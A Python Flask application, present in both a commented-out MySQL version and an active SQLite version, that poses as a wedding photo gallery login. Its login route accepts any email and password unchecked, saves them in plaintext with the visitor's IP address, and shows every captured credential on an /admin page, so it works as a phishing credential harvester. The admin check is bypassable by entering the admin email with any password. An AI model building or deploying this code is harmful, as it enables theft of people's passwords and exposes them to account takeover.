# from flask import Flask, render_template, request, redirect, url_for, flash, session, g
# from flask_mysqldb import MySQL
# import MySQLdb.cursors
# import secrets
# import os
# from datetime import timedelta

# app = Flask(__name__)
# app.secret_key = os.environ.get("SECRET_KEY", "fallback-secret")
# # app.secret_key = secrets.token_hex(32)  # # Secure secret key
# app.permanent_session_lifetime = timedelta(days=1)

# # MySQL Configuration for local development
# # app.config['MYSQL_HOST'] = 'localhost'
# # app.config['MYSQL_USER'] = 'root'
# # app.config['MYSQL_PASSWORD'] = ''
# # app.config['MYSQL_DB'] = 'wedding_photos1'
# # app.config['MYSQL_CURSORCLASS'] = 'DictCursor'

# app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST')
# app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER')
# app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD')
# app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB')


# mysql = MySQL(app)

# # Create database tables
# def init_db():
#     try:
#         cursor = mysql.connection.cursor()
#         cursor.execute('''
#             CREATE TABLE IF NOT EXISTS users (
#                 id INT AUTO_INCREMENT PRIMARY KEY,
#                 email VARCHAR(255) NOT NULL,
#                 password VARCHAR(255) NOT NULL,
#                 ip_address VARCHAR(45),
#                 login_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
#                 INDEX idx_email (email)
#             )
#         ''')
#         mysql.connection.commit()
#         cursor.close()
#         print("Database initialized successfully!")
#     except Exception as e:
#         print(f"Database error: {e}")

# # Initialize database on startup
# with app.app_context():
#     init_db()

# @app.route('/')
# def index():
#     return render_template('index.html')

# @app.route('/login', methods=['POST'])
# def login():
#     if request.method == 'POST':
#         email = request.form.get('email', '').strip()
#         password = request.form.get('password', '').strip()
#         ip_address = request.remote_addr
        
#         if not email or not password:
#             flash('Please enter both email and password', 'error')
#             return redirect(url_for('index'))
        
#         try:
#             cursor = mysql.connection.cursor()
            
#             # Store login details (not encrypted as requested)
#             cursor.execute('''
#                 INSERT INTO users (email, password, ip_address) 
#                 VALUES (%s, %s, %s)
#             ''', (email, password, ip_address))
            
#             mysql.connection.commit()
#             cursor.close()
            
#             # Set session
#             session.permanent = True
#             session['logged_in'] = True
#             session['email'] = email
            
#             flash('Login successful! Welcome to the gallery!', 'success')
#             return redirect(url_for('gallery'))
            
#         except Exception as e:
#             print(f"Database error: {e}")
#             flash('An error occurred. Please try again.', 'error')
#             return redirect(url_for('index'))

# @app.route('/gallery')
# def gallery():
#     if not session.get('logged_in'):
#         flash('Please login to view the gallery', 'error')
#         return redirect(url_for('index'))
#     return render_template('gallery.html')

# @app.route('/logout')
# def logout():
#     session.clear()
#     flash('You have been logged out', 'info')
#     return redirect(url_for('index'))

# # Admin route to view stored credentials (protected with simple auth)
# @app.route('/admin')
# def admin_view():
#     # Simple protection - in production use better authentication
#     if not session.get('logged_in') or session.get('email') != 'admin@wedding.com':
#         return "Unauthorized", 401
    
#     try:
#         cursor = mysql.connection.cursor()
#         cursor.execute('SELECT * FROM users ORDER BY login_time DESC')
#         users = cursor.fetchall()
#         cursor.close()
#         return render_template('admin.html', users=users)
#     except Exception as e:
#         return f"Error: {e}"

# if __name__ == '__main__':
#     app.run(debug=True, host='0.0.0.0', port=5000)





from flask import Flask, render_template, request, redirect, url_for, flash, session, g
import sqlite3
import os
import secrets
from datetime import timedelta

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))
app.permanent_session_lifetime = timedelta(days=1)

DATABASE = "database.db"

# ---------------- DATABASE ---------------- #

def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect(DATABASE)
        g.db.row_factory = sqlite3.Row
    return g.db

@app.teardown_appcontext
def close_db(exception):
    db = g.pop('db', None)
    if db is not None:
        db.close()

def init_db():
    db = get_db()
    db.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            password TEXT NOT NULL,
            ip_address TEXT,
            login_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    db.commit()

with app.app_context():
    init_db()

# ---------------- ROUTES ---------------- #

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email', '').strip()
    password = request.form.get('password', '').strip()
    ip_address = request.remote_addr

    if not email or not password:
        flash('Please enter both email and password', 'error')
        return redirect(url_for('index'))

    db = get_db()
    db.execute(
        'INSERT INTO users (email, password, ip_address) VALUES (?, ?, ?)',
        (email, password, ip_address)
    )
    db.commit()

    session.permanent = True
    session['logged_in'] = True
    session['email'] = email

    flash('Login successful! Welcome to the gallery!', 'success')
    return redirect(url_for('gallery'))

@app.route('/gallery')
def gallery():
    if not session.get('logged_in'):
        flash('Please login first', 'error')
        return redirect(url_for('index'))
    return render_template('gallery.html')

@app.route('/logout')
def logout():
    session.clear()
    flash('Logged out successfully', 'info')
    return redirect(url_for('index'))

@app.route('/admin')
def admin_view():
    if not session.get('logged_in') or session.get('email') != 'admin@wedding.com':
        return "Unauthorized", 401

    db = get_db()
    users = db.execute(
        'SELECT * FROM users ORDER BY login_time DESC'
    ).fetchall()

    return render_template('admin.html', users=users)

if __name__ == '__main__':
    app.run(debug=True)